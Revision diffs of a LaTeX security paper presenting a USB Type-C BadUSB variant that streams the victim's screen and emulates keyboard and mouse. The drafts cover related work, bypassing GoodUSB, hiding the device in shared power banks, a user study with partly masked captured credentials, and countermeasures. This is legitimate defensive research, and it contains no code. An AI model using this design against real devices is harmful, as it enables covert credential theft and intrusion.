-Though some of such prompts are not conspicuous for non-experts, especially when \tool is concealed within other functional hardware such as power banks \shuqing{If there is experiment, add it here.}, the probability whether users could get aware that something unusual happens will increase with the existence these prompting messages.
+
+There exist multiple limitations of \tool.  To begin with, \tool can only gain
+the information and control access of the host itself instead of external
+hardware.  Consequently, as we introduced in the
+Section~\ref{sec:countermeasures}, \tool can hardly bypass the defense
+approaches which use external hardware for authorization.  Moreover, most of
+the devices will prompt users to give authentication to the USB devices or
+select one of the functional modes after they are plugged in.  Though some of
+such prompts are not conspicuous for non-experts, especially when \tool is
+concealed within other functional hardware such as power banks \shuqing{If
+there is experiment, add it here.}, the probability whether users could get
+aware that something unusual happens will increase with the existence these
+prompting messages.
 
 \subsection{Impact}
-%\shuqing{Left after experiment to finish. Will discuss from different modes and application scenarios.}
-The USB protocol is used widely as introduced in preceding sections.
-As the technologies develops rapidly, more and more devices will be equipped with USB-C capabilities, which makes \tool more influential.
-Due to the neglection to check the security of plugged-in USB devices of non-professional users, \tool can be hardly detected by them while attacks are performing.
-The popularity and universality of public USB devices, including sharing power banks, even increase such risks.
-What's more, \tool provides a better way for traditional BadUSB attacks, since attackers can obtain the screen streaming with ease.
-Attackers can use such technologies to perform more precise attacks, such as interacting with user interface, as well as control the consequences of their attacks.
-In summary, \tool can be applied in various application scenarios and brings rather huge impacts.
+
+%\shuqing{Left after experiment to finish. Will discuss from different modes
+%and application scenarios.}
+The USB protocol is used widely as introduced in preceding sections.  As the
+technologies develop rapidly, more and more devices will be equipped with USB-C
+capabilities, which makes \tool more influential.  Due to the neglection to
+check the security of plugged-in USB devices of non-professional users, \tool
+can be hardly detected by them while attacks are performing.  The popularity
+and universality of public USB devices, including sharing power banks, even
+increase such risks.  Moreover, \tool provides a better way for traditional
+BadUSB attacks, since attackers can obtain the screen streaming with ease.
+Attackers can use such technologies to perform more precise attacks, such as
+interacting with user interface, as well as control the consequences of their
+attacks.  In summary, \tool can be applied in various application scenarios and
+brings rather huge impacts.

### 2021-01-28 WOOT/Files/related_work.tex
related work update

--- 2021-01-27 WOOT/Files/related_work.tex
@@
 
-During the development of USB protocol, many USB-based attacks were proposed,
+During the development of the USB protocol, many USB-based attacks were proposed,
 ranging from DoS (Denial of Service) to protocol masquerading.
@@
 Syzkaller~\cite{syzkaller} use fuzzing techniques to uncover the bugs lying in
-the kernel drivers. These bugs can cause kernel crash and lead to a DoS attack.
+the kernel drivers. These bugs can cause kernel crashes and lead to a DoS attack.
 Though this poses a great challenge to the availability of a system, this
@@
 These works rewrite the firmware of a normal-looking flash drive, which allows
-it to pretend as other devices. When these modified drives are connected to the
-host, they could be recognized as keyboard or mouse. Then the attacker can
+it to pretend like other devices. When these modified drives are connected to the
+host, they could be recognized as a keyboard or mouse. Then the attacker can
 execute malicious payloads as they were using the victim's devices. Due to the
 limitation of USB 2.0~\cite{usb20} protocol, these BadUSB
-attacks\fengwei{reference?} are unable to obtain video feedback from the victim
-as video were not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
+attacks\cite{badusb} are unable to obtain video feedback from the victim
+as video was not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
 support video transmission, there exists a protocol called MHL (Mobile
-High-Definition Link) which extends the USB standard and allow video signal to
-be transmitted through USB interface. JFC~\cite{JFC}, short for juicy filming
-charging is such a work which abuses this standard and exfiltrate video data
-from victim without permission. But in JFC, this data exfiltration is not
+High-Definition Link) which extends the USB standard and allows the video signal to
+be transmitted through the USB interface. JFC~\cite{JFC}, short for juicy filming
+charging is such a work that abuses this standard and exfiltrate video data
+from the victim without permission. But in JFC, this data exfiltration is not
 combined with BadUSB attacks and MHL is an outdated standard, which limits its
@@
 % Using USB devices to inject code
-Besides attacking from the protocol perspective, there are works trying to use
+Besides attacking from the protocol perspective, works are trying to use a
 USB device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
@@
 zero-day exploit and malicious \textit{autorun.inf} to execute the malware
-automatically. There are also works like \cite{brain, stuxnet, conficker}
+automatically. There are also works like \cite{brain,stuxnet,conficker}
 following the same paradigm and performing code-injection attacks. These
 attacks are much more damaging and flexible comparing to those previous ones,
-but they requires certain existing flaw like \cite{zero-day} and USB is merely
+but they require certain existing flaw like \cite{zero-day} and USB is merely
 a payload delivery method.
@@
 As a data transmission protocol, USB inevitably leaks electromagnetic signals
-to the environment which may contains sensitive information. Leveraging this
+to the environment which may contain sensitive information. Leveraging this
 physical phenomenon, previous works~\cite{smartphone,
 poweremi,revealing,su2017usb,usbgpslocator,bates2014leveraging,badusbhub,usbfinger,side,usbdriver}
-eavesdrop leaked signals and recover the sensitive data. In a similar fashion,
+eavesdrop on leaked signals and recover the sensitive data. In a similar fashion,
 \cite{usbee,turnip} emit electromagnetic emissions by data injection on the bus
-with the connected USB devices as a RF transmitter and \cite{usbkiller,
-cable}\fengwei{we don't need to have space between references} inject analog
+with the connected USB devices as an RF transmitter and \cite{usbkiller,cable}
+inject analog
 power to cause physical damage to the host machine. Even though the data,
 including the video data, could be recovered in this way, these attacks for
-executing malicious code is too difficult to work, and the invisibility is a
-problem cannot be ignored due to the spacial locality of radio frequency.
+executing malicious code are too difficult to work, and the invisibility is a
+problem that cannot be ignored due to the spatial locality of radio frequency.
 
@@
 combined with the other attacks, like protocol masquerading,  protocol
-corruption and code injection. This has paved the path for our \tool.
+corruption, and code injection. This has paved the path for our \tool.
 
@@
 
-From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which
-are defined by protocol to transmitting data.  Without these pins, data can't
-\fengwei{use "cannot" instead of "can't"} be transferred via USB cable. Based
+From the hardware perspective, the BadUSB attack requires `D-' and `D+' pins which
+are defined by the protocol to transmitting data. Without these pins, data cannot 
+be transferred via USB cable. Based
 on this fact, USB Condom \cite{Condom} is a hardware solution to block data
-channel by adding blocker in the connector. This blocker can cut off the `D-'
-and `D+' connection while leave power pins intact.  However, this method poses
-a great challenge to plug-and-play property of USB, as once it is deployed, it
+channels by adding a blocker in the connector. This blocker can cut off the `D-'
+and `D+' connection while leaving power pins intact.  However, this method poses
+a great challenge to the plug-and-play property of USB, as once it is deployed, it
 stops all USB functions other than charging.
@@
 whitelist. For example, a naive user may add the USB device from unknown
-sources to his/her whitelist without precaution. There are designs can overcome
+sources to his/her whitelist without precaution. Some designs can overcome
 this drawback. For instance, Mohammadmoradi et
@@
 mediating USB connectivity for Industrial Control. TMSUI~\cite{yang2015tmsui}
-relies on rich experience of administrators to build a whitelist. However, some
+relies on the rich experience of administrators to build a whitelist. However, some
 modified USB devices may hide their real functionality from the user.
 
-To solve this flaw, GoodUSB~\cite{tian2015defending} will\fengwei{Don't use
-future tense. We can just use present tense.} report the functionality claimed
-by the device to user and let user decides whether to authorize. When a device
-is plugged in, GoodUSB will load its driver but limit its functionality until a
-series of authorizations is completed. These authorizations are designed to be
-performed manually. As BadUSB is normally unable to obtain the video stream of
-the host, it is impossible for an attacker to complete these authorization with
-automatic script. Thus this defense is sufficient for normal BadUSB attack. But
-if the attacker has the access to victim's screen, GoodUSB will be bypassed
-easily as the attacker can just complete these authorization manually and
-perform subsequent attacks.
+To solve this flaw, GoodUSB~\cite{tian2015defending} will\fengwei{Don't use future tense.
+We can just use resent tense.} report the functionality claimed by the device to the user and let the user decides whether to authorize.
+When a device is plugged in, GoodUSB will load its driver but limit its functionality until a series of authorizations are completed.
+These authorizations are designed to be performed manually.
+As BadUSB is normally unable to obtain the video stream of the host, an attacker cannot complete this authorization with an automatic script.
+Thus this defense is sufficient for a normal BadUSB attack.
+But if the attacker has the access to victim's screen, GoodUSB will be bypassed easily as the attacker can just complete this authorization manually and perform subsequent attacks.
 
-After the USB enumeration and driver loading, there are\fengwei{I feel too many
-"there are" style sentences.} also works trying to archive `defense in depth'
-against BadUSB attack.  Neuner et
-al.~\cite{neuner2018usblock}\fengwei{Typicall, we add "~" to create a space for
-each citation.} prevents BadUSB attacks from malicious flash drive by analyzing
-the temporal characteristics of BadUSB-like attacks. This defense mechanism is
-effective because the attacker cannot obtain the screen of the host using
-BadUSB. In this case, the malicious device can only inject key stoke in a very
-short time to reduce the risk of being discovered. This defect causes the
-typing characteristics of BadUSB to be detectable. Pham et
-al.~\cite{pham2010optimizing} optimizing windows security features. It can
-block the execution of unsigned files, the installation of unsigned driver
-carried on portable media. Moreover, in GoodUSB, a VM is deployed in host to as
-a honeypot to detect and stop malicious behavior of USB devices.
+After the USB enumeration and driver loading, there are\fengwei{I feel too many "there are" style sentences.} also works trying to archive `defense in depth' against BadUSB attack.
+Neuner et al.~\cite{neuner2018usblock}\fengwei{Typicall, we add "~" to create a space for each citation.} prevents BadUSB attacks from the malicious flash drive by analyzing the temporal characteristics of BadUSB-like attacks.
+This defense mechanism is effective because the attacker cannot obtain the screen of the host using BadUSB.
+In this case, the malicious device can only inject key stoke in a very short time to reduce the risk of being discovered.
+This defect causes the typing characteristics of BadUSB to be detectable.
+Pham et al.~\cite{pham2010optimizing} optimizing windows security features.
+It can block the execution of unsigned files, the installation of unsigned drivers carried on portable media.
+Moreover, in GoodUSB, a VM is deployed in the host to as a honeypot to detect and stop malicious behavior of USB devices.
 
-In addition to injection attacks, data theft attack is also one of the focuses
-of academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL
-standard to steal video stream from the victim. In order to mitigate this
-issue, Meng et al.\cite{meng2018252} proposed a statistical model using status
-like GPU/CPU usage to detect JFC attack.
+In addition to injection attacks, data theft attack is also one of the focuses of the academic community.
+As mentioned in Section~\ref{subsec:usb_attack}, there exists an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
+In order to mitigate this issue, Meng et al.\cite{meng2018252} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
 
-To summarize, there exists a clear trade-off between the effectiveness and the
-plug-and-play property. Though hardware disabling solution like USB Condom
-archives the almost absolute security, the functionality of USB is scarified.
-Other solutions like GoodUSB or whitelist are either bypassable or insufficient
-under certain cases.  Some vendors may sacrifice defensive capabilities to
-improve usability, which allows attackers to take advantage of.
+To summarize, there exists a clear trade-off between the effectiveness and the plug-and-play property.
+Though hardware disabling solutions like USB Condom archives almost absolute security, the functionality of USB is scarified.
+Other solutions like GoodUSB or whitelist are either bypassable or insufficient under certain cases.
+Some vendors may sacrifice defensive capabilities to improve the usability, which allows attackers to take advantage of.
 

### 2021-01-28 WOOT/BadUSBC.tex

@@
 \fengwei{what countermeasures do we propose? including isolated UI rendering.}
-We also proposed reasonable countermeasures for our attack model, which may be inspiring for future research on defense methods.
+We also proposed reasonable countermeasures for our attack model, including isolated UI rendering, external hardware authorization and distrust-by-default, which may be inspiring for future research on defense methods.
 \end{abstract}

### 2021-01-28 WOOT/Files/badusb.tex

@@
 The advantage of this mode is that it archives defense bypass and attack
-feedback with low overhead.  \fengwei{I don't understand the sentence below.}
-As mentioned above, we only require video stream at the beginning (defense
-bypass) and the end (result feedback) of the attack. Moreover, with mouse
+feedback with video streaming.  \fengwei{I don't understand the sentence below.}\hongyi{Fixed, I think it's redundant and less important}
+%As mentioned above, we only require video stream at the beginning (defense
+%bypass) and the end (result feedback) of the attack. 
+Moreover, with mouse
 supported, \tool extends the original BadUSB attack surface and perform well in
@@
 USB device and solely relies on the video stream function of USB 3.x; it uses
-``Video Capture'' component to transmit the stream to the embedded
-computer\fengwei{What is embedded computer? Do we define this in the previous
+``Video Capture'' component to transmit the stream to embedded ``Single Board Computer''\fengwei{What is embedded computer?
+Do we define this in the previous\hongyi{Fixed by using the term mentioned in Figure}
 text?}. The victim's device would mistakenly treat \tool as an external monitor

### 2021-01-28 WOOT/Files/related_work.tex

@@
 be transferred via USB cable. Based
-on this fact, USB Condom \cite{Condom} is a hardware solution to block data
+on this fact, USB Condom~\cite{Condom} is a hardware solution to block data
 channels by adding a blocker in the connector. This blocker can cut off the `D-'
@@
 
-To solve this flaw, GoodUSB~\cite{tian2015defending} will\fengwei{Don't use future tense.
-We can just use resent tense.} report the functionality claimed by the device to the user and let the user decides whether to authorize.
-When a device is plugged in, GoodUSB will load its driver but limit its functionality until a series of authorizations are completed.
-These authorizations are designed to be performed manually.
-As BadUSB is normally unable to obtain the video stream of the host, an attacker cannot complete this authorization with an automatic script.
-Thus this defense is sufficient for a normal BadUSB attack.
-But if the attacker has the access to victim's screen, GoodUSB will be bypassed easily as the attacker can just complete this authorization manually and perform subsequent attacks.
+To solve this flaw, GoodUSB~\cite{tian2015defending} reports the functionality claimed
+by the device to the user and let the user decides whether to authorize. When a device
+is plugged in, GoodUSB will load its driver but limit its functionality until a
+series of authorizations are completed. These authorizations are designed to be
+performed manually. As BadUSB is normally unable to obtain the video stream of
+the host, an attacker cannot complete this authorization with
+an automatic script. Thus this defense is sufficient for normal BadUSB attack. But
+if the attacker has the access to victim's screen, GoodUSB will be bypassed
+easily as the attacker can just complete this authorization manually and
+perform subsequent attacks.
 
-After the USB enumeration and driver loading, there are\fengwei{I feel too many "there are" style sentences.} also works trying to archive `defense in depth' against BadUSB attack.
-Neuner et al.~\cite{neuner2018usblock}\fengwei{Typicall, we add "~" to create a space for each citation.} prevents BadUSB attacks from the malicious flash drive by analyzing the temporal characteristics of BadUSB-like attacks.
-This defense mechanism is effective because the attacker cannot obtain the screen of the host using BadUSB.
-In this case, the malicious device can only inject key stoke in a very short time to reduce the risk of being discovered.
-This defect causes the typing characteristics of BadUSB to be detectable.
-Pham et al.~\cite{pham2010optimizing} optimizing windows security features.
-It can block the execution of unsigned files, the installation of unsigned drivers carried on portable media.
-Moreover, in GoodUSB, a VM is deployed in the host to as a honeypot to detect and stop malicious behavior of USB devices.
+After the USB enumeration and driver loading, there are
+also works trying to archive `defense in depth'
+against BadUSB attack.  Neuner et 
+al.~\cite{neuner2018usblock}
+prevents BadUSB attacks from the malicious flash drive by analyzing
+the temporal characteristics of BadUSB-like attacks. This defense mechanism is
+effective because the attacker cannot obtain the screen of the host using
+BadUSB. In this case, the malicious device can only inject key stoke in a very
+short time to reduce the risk of being discovered. This defect causes the
+typing characteristics of BadUSB to be detectable. Pham et
+al.~\cite{pham2010optimizing} optimize windows security features. It can
+block the execution of unsigned files and the installation of unsigned drivers
+carried on portable media. Moreover, in GoodUSB, a VM is deployed in the host to as
+a honeypot to detect and stop malicious behavior of USB devices.
 
-In addition to injection attacks, data theft attack is also one of the focuses of the academic community.
-As mentioned in Section~\ref{subsec:usb_attack}, there exists an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
-In order to mitigate this issue, Meng et al.\cite{meng2018252} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
+In addition to injection attacks, data theft attack is also one of the focuses
+of the academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
+exists an attack called JFC (juicy film charging)~\cite{JFC} which abuses the MHL
+standard to steal video stream from the victim. In order to mitigate this
+issue, Meng et al.~\cite{meng2018252} proposed a statistical model using status
+like GPU/CPU usage to detect JFC attack.
 
-To summarize, there exists a clear trade-off between the effectiveness and the plug-and-play property.
-Though hardware disabling solutions like USB Condom archives almost absolute security, the functionality of USB is scarified.
-Other solutions like GoodUSB or whitelist are either bypassable or insufficient under certain cases.
-Some vendors may sacrifice defensive capabilities to improve the usability, which allows attackers to take advantage of.
+To summarize, there exists a clear trade-off between the effectiveness and the
+plug-and-play property. Though hardware disabling solutions like USB Condom
+archives almost absolute security, the functionality of USB is scarified.
+Other solutions like GoodUSB or whitelist are either bypassable or insufficient
+under certain cases.  Some vendors may sacrifice defensive capabilities to
+improve the usability, which allows attackers to take advantage of.
 

### 2021-01-28 WOOT/Files/related_work.tex
update related work

@@
 limitation of USB 2.0~\cite{usb20} protocol, these BadUSB
-attacks\cite{badusb} are unable to obtain video feedback from the victim
+attacks~\cite{badusb} are unable to obtain video feedback from the victim
 as video was not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
@@
 
-After the USB enumeration and driver loading, there are
-also works trying to archive `defense in depth'
+After the USB enumeration and driver loading, some related works
+trying to archive `defense in depth'
 against BadUSB attack.  Neuner et 

### 2021-01-29 WOOT/Files/experiment.tex
[experiment] restore figures
[experiment] volunteers amount

@@
 
-For an example, Brick\fengwei{reference?} is such a power bank sharing service
+For an example, Brick~\cite{Brick} is such a power bank sharing service
 provider from Sweden. It provides power bank rental service all over the Sweden
@@
 	\centering
-	\includegraphics[width=.4 \linewidth]{./Figs/Brick_station.png}
-	\includegraphics[width=.4 \linewidth]{./Figs/jiedian.jpg}
-	\caption{Two power banks station products}\shuqing{Photos that we took.}
+	\includegraphics[width=.45 \linewidth, height=.45 \linewidth]{./Figs/PBS_mt.png}
+	\includegraphics[width=.45 \linewidth, height=.45 \linewidth]{./Figs/PBS_xd.png}
+	\caption{Two power banks station products}
 	\label{fig:PBS_products}
@@
 QR code payment is a new type of payment method that are popular in Asia.
-Its most well known cases are WeChat Pay and Alipay\fengwei{reference?}.
+Its most well known cases are WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay}.
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
@@
 authorize multiple micropayments without permission.  In order to prevent such
-cases, both Alipay and WeChat Pay has designed a refreshing mechanism for the
+cases, both WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay} has designed a refreshing mechanism for the
 payment code, which is to refresh the QR code every minute. This is sufficient
@@
 \shuqing{10 volunteers.}
-We invited 6 volunteers to participate, who are unconscious of \tool details.
+We invited 10 volunteers to participate, who are unconscious of \tool details.
 Before the experiment, we disclose to the volunteers about how their data might be used and request permission from both the volunteers and the institutional ethics review boards.
@@
 During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded video and stored all of the OCR results in a database.
-At last, there are 38329 pieces of data collected among 6 volunteers.
+At last, there are 63882 pieces of data collected among 10 volunteers.
 \shuqing{The data may need to be updated.}
@@
 		Keyword  & Text                                                                                                                          & Name                           & Frame Number \\ \hline
-		username & X 8B cas.******.edu.cn Username: 117***18 Password:                                                                           & \textless{}user1\textgreater{} & 385          \\ \hline
+		username & X 8B cas.******.edu.cn Username: 11****18 Password:                                                                           & \textless{}user1\textgreater{} & 385          \\ \hline
 		username & Login Weibo Login with SMS and verification code ...... +86 151****4587 & \textless{}user5\textgreater{} & 1947         \\ \hline

### 2021-01-30 WOOT/Files/experiment.tex
fix confusion

@@
 by the design of GoodUSB, \fengwei{The following sentence is hard to
-understand.} our \tool can already perform limited keystroke to complete the
-CAPTCHA and will be rejected only after the failure of authorization. With the
-video feedback from \tool, the attacker successfully completes the CAPTCHA.  Up
+understand.}\hongyi{Fixed, removed redundant description} our \tool can already perform limited keystroke to complete the
+CAPTCHA with video stream from \tool. Up
 to this point, the bypass of defense like GoodUSB is completed as our \tool
@@
 	\includegraphics[width=.45 \linewidth, height=.45 \linewidth]{./Figs/PBS_xd.png}
-	\caption{Two power banks station products}
+	\caption{Two Power Bank Stations}
 	\label{fig:PBS_products}

### 2021-01-30 WOOT/Files/introduction.tex
Minor
grammarlized introduction

@@
 On the other side of the coin, the security of USB has caused serious problems.
-The designers of USB protocol did not care much about security issues as they wanted to make an easy-to-use protocol.
+The designers of the USB protocol did not care much about security issues as they wanted to make an easy-to-use protocol.
 There are more than four hundred vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.
@@
 Utilizing BadUSB, attackers can pretend themselves as normal users, typing malicious commands to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
-Such attacks can easily escape from traditional anti-virus software, since it is hard to distinguish them from normal USB devices.
+Such attacks can easily escape from traditional anti-virus software since it is hard to distinguish them from normal USB devices.
 
@@
 When performing attacks on another host, the attackers can not obtain the current user interface (UI) status which limits them from taking subsequent moves.
-For example, it is hard for attackers to locate specific functional UI patterns like buttons and links on victim computers by disguising USB devices as mice.
-That explains why typical BadUSB attacks often only stay in command line, using commands to download malicious scripts for execution.
-However, these attacks may be intercepted by anti-virus software or firewall due to the usage of host network.
+For example, it is hard for attackers to locate specific functional UI patterns like buttons and links on victim computers by disguising USB devices like mice.
+That explains why typical BadUSB attacks often only stay in the command line, using commands to download malicious scripts for execution.
+However, these attacks may be intercepted by anti-virus software or firewall due to the usage of the host network.
 (2) To our best knowledge, existing BadUSB attacks only utilize the features of USB 2.0.
-The releasing of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of peripherals including DisplayPort, HDMI, PowerDelivery, etc.
+The release of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of peripherals including DisplayPort, HDMI, PowerDelivery, etc.
 BadUSB attacks can become more effective with the help of newly supported features in USB 3.0.
 (3) There have emerged multiple efficacious countermeasures after the appearance of BadUSB.
-For example, GoodUSB offers a defence method by limiting the functions of USB devices to users' expectations~\cite{tian2015defending}.
-It provides a graphical interface for user to describe the functionalities or roles of the USB device and reject any usage beyond the description.
+For example, GoodUSB offers a defense method by limiting the functions of USB devices to users' expectations~\cite{tian2015defending}.
+It provides a graphical interface for users to describe the functionalities or roles of the USB device and reject any usage beyond the description.
 %\shuqing{Can't bypass USBCheckIn.}
 
-In this work, we proposed our approach to address the limitations mentioned above and implemented a multi-mode attack model of USB, named \tool.
+In this work, we proposed our approach addressing the limitations mentioned above and implemented a multi-mode attack model of USB, named \tool.
 \tool extends BadUSB to support the features of USB Type-C.
 Since USB Type-C is capable to transfer video stream data, \tool could obtain the information of victim's graphical interface during attacks.
-Combining it with simulation of traditional HIDs like keyboards and mice, attackers can perform precise attacks.
+Combining it with the emulation of traditional HIDs like keyboards and mice, attackers can perform precise attacks.
 We did experiments to verify that \tool could also bypass many countermeasures for BadUSB since they often rely on interaction with the graphical interface.
@@
 To improve the efficiency and performance of \tool, we designed a filtering algorithm to preprocess the video data before network transmission.
-Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smart phones, personal computers, and tablet computers, to validate the usability of \tool.
+Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smartphones, personal computers, and tablet computers, to validate the usability of \tool.
 We also conducted a user study for attacks in sharing power banks, one of the application scenarios of \tool.
 During the user study, we obtained plenty of sensitive data through \tool, since users are usually unconscious of the necessity to check the USB devices they plugged in for security purposes.
-After the validation of our attack model, we proposed several defence methods as countermeasures, including external hardware authorization, distrust-by-default, etc.
+After the validation of our attack model, we proposed several defense methods as countermeasures, including external hardware authorization, distrust-by-default, etc.
 It is worth noting that we designed a method, called isolated UI rendering, to separate the user interface into sensitive and insensitive layers.
-Only content on the insensitive layer will be passed to the insecure driver and thus rendered on external display, which protects content on the sensitive layer.
+Only content on the insensitive layer will be passed to the insecure driver and thus rendered on the external display, which protects content on the sensitive layer.
 %\shuqing{Case study, evaluation, notable results.}
@@
 	We also proposed several countermeasures for our attack model, which are reasonable and insightful. 
-\fengwei{Add countermeasures, in particular the isolation design.}\shuqing{Isolated UI rendering is added in the last paragraph.}
+	%\fengwei{Add countermeasures, in particular the isolation design.}
+	%\shuqing{Isolated UI rendering is added in the last paragraph.}
 \end{itemize}
@@
 Section~\ref{sec:background} provides the background of USB specification.
-Section~\ref{sec:related_work} introduces the existing work of USB security from the aspects of attacking and defence respectively.
+Section~\ref{sec:related_work} introduces the existing work of USB security from the aspects of attacking and defense respectively.
 In Section~\ref{sec:badusb}, we present the threat model and the overall implementation of \tool in three different modes.
 The experiments and user study we conducted are featured in Section~\ref{sec:experiment}.
-We presents the possible countermeasures of \tool in Section~\ref{sec:countermeasures}.
+We present the possible countermeasures of \tool in Section~\ref{sec:countermeasures}.
 The limits and impacts of our approach are discussed in Section~\ref{sec:discussion}, and the conclusion lies in Section~\ref{sec:conclusion}.

### 2021-01-30 WOOT/Files/background.tex
grammarlized backgroud

@@
 %\noindent\outline{USB1.x}\\
-Proposed in 1996, USB 1.0\cite{usb10} was developed to provide an unified
-interface and thus reducing the cost of re-configuring the software. It is
+Proposed in 1996, USB 1.0\cite{usb10} was developed to provide a unified
+interface and thus reducing the cost of reconfiguring the software. It is
 worth mentioning that as a polled-bus interface, all data transfers are
@@
 Right after one year of the appearance of USB 1.0, a standard named HID (Human
-Interface Device)\hongyi{Citation Needed} was born on the basis of USB. HID is
-designed with the goal of unifying the implementation for devices like mouse,
+Interface Device)\hongyi{Citation Needed} was born based on USB. HID is
+designed with to unify the implementation for devices like mouse,
 keyboard, etc. Before its appearance, the standard is divided between
-manufacturers, for example, mouses of Company A may uses X-Y coordinates to
-represent its location while mouses of Company B uses relative displacement.
-This means every device needs their own drivers to work. After HID, people just
+manufacturers, for example, the mouse of Company A may use X-Y coordinates to
+represent its location while the mouse of Company B uses relative displacement.
+This means every device needs its own drivers to work. After HID, people just
 write one driver for an entire class of HIDs. Furthermore, HID standard also
 requires all devices to be PnP (\emph{Plug-and-Play}), which is indeed
-convenient but may be insecure too.
+convenient but insecure too.
 
@@
 Speed (12 MBit/s). At this point, due to the transfer limit, it only supports
-limited types of devices like keyboard, mice, etc.
+limited types of devices like keyboards, mice, etc.
 
@@
 In 2000, USB 2.0\cite{usb20} specification was released. With High Speed (480
-Mbit/s) mode introduced, printer, camera, CD-ROM drive and network cards were
-supported in this revision. Such high data transfer rate also gave rise to the
-popularity of ``flash drive'', portable device that allows physically
+Mbit/s) mode introduced, printer, camera, CD-ROM drive, and network cards were
+supported in this revision. Such a high data transfer rate also gave rise to the
+popularity of ``flash drive'', a portable device that allows physically
 transferring data around~\cite{sok}. Though various peripherals were supported
-in USB 2.0, there was no reliable way to identify the type of a device. This
-security flaw allowed attacks like BadUSB~\cite{rubber}.
+in USB 2.0, there was no reliable way to identify the type of device. This
+security flaw allowed attacks like BadUSB~\cite{badusb,rubber}.
 
@@
 transfer rate. Like its predecessor, more classes of peripherals were supported
-in this revision. In 2013, USB Type-C connector standard was introduced as a
+in this revision. In 2013, the USB Type-C connector standard was introduced as a
 part of USB 3.1\cite{usb31}, providing a unified connector type for
@@
 security was introduced in 3.x revisions, meaning any device claiming
-themselves as a monitor can capture the video stream from the host. Exposing
-such multi-propose connector unprotected is dangerous and allows attacks like
+itself as a monitor can capture the video stream from the host. Exposing
+such a multi-propose connector unprotected is dangerous and allows attacks like
 this work \tool. In 2017, USB 3.2\cite{usb32} was released, doubling the data
@@
 standard called USB Type-C is introduced in 2013 by USB-IF\fengwei{Need a
-citation}. As it is designed to be double-sided, the number of actual usable
+citation}. As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability
-of USB 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
-two high speed data lanes (TRX1 \& TRX2) and kept the original data lane (D+ \&
+of the USB 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
+two high-speed data lanes (TRX1 \& TRX2) and kept the original data lane (D+ \&
 D-). The added lanes are used exclusively to support peripherals like
@@
 to decide whether security features should be implemented.\hongyi{Citation
-needed}. But the divergent implementations give a chance for attack like
+needed}. But the divergent implementations give a chance for attacks like
 BadUSB~\cite{rubber} and our \tool.
@@
 	\hline
-	1996 & USB 1.x & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating(BadUSB) \\
+	1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating(BadUSB)~\cite{badusb} \\
 	\hline
-	2000 & USB 2.0 & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack, Juice Filming Attack \\
+	2000 & USB 2.0~\cite{usb20} & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack~\cite{duqu}, Juice Filming Attack~\cite{JFC,JFCImpact} \\
 	\hline
-	2008 & USB 3.0 & / & 5 Gbit/s & / \\
+	2008 & USB 3.0~\cite{usb30} & / & 5 Gbit/s & / \\
 	\hline
-	2013 & USB 3.1 & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
+	2013 & USB 3.1~\cite{usb31} & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
 	\hline
-	2017 & USB 3.2 & / & 20 Gbit/s & / \\
+	2017 & USB 3.2~\cite{usb32} & / & 20 Gbit/s & / \\
 	\hline

### 2021-01-30 WOOT/Files/background.tex
fix ref in intro/bg

@@
 Right after one year of the appearance of USB 1.0, a standard named HID (Human
-Interface Device)\hongyi{Citation Needed} was born based on USB. HID is
+Interface Device)~\cite{hid} was born based on USB. HID is
 designed with to unify the implementation for devices like mouse,
@@
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called USB Type-C is introduced in 2013 by USB-IF\fengwei{Need a
-citation}. As it is designed to be double-sided, the number of actually usable
+standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF. As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability
@@
 the USB-IF believes it is the duty of original equipment manufacturers (OEMs)
-to decide whether security features should be implemented.\hongyi{Citation
-needed}. But the divergent implementations give a chance for attacks like
+to decide whether security features should be implemented~\cite{usbsec}. But the divergent implementations give a chance for attacks like
 BadUSB~\cite{rubber} and our \tool.
 
-\fengwei{FIXME: add a reference for each attack in the Table.}
+%\fengwei{FIXME: add a reference for each attack in the Table.}
 \begin{table*}

### 2021-01-30 WOOT/Files/experiment.tex
grammarlized experiment

@@
 computer inside \tool, which is powerful enough to process video data and has
-onboard WiFi chip. As for the HID emulator, we decide to use a ATMEGA32U4 board~\cite{atmel}
+an onboard WiFi chip. As for the HID emulator, we decide to use an ATMEGA32U4 board~\cite{atmel}
 with USB protocol support. This Atmel chip is able to emulate most HID devices
-with our modified firmware. About the USB 3.x hub, we uses one from the
+with our modified firmware. About the USB 3.x hub, we use one from the
 UGREEN~\cite{ugreen}, which supports HDMI, USB 2.0, and many other exported peripheral.
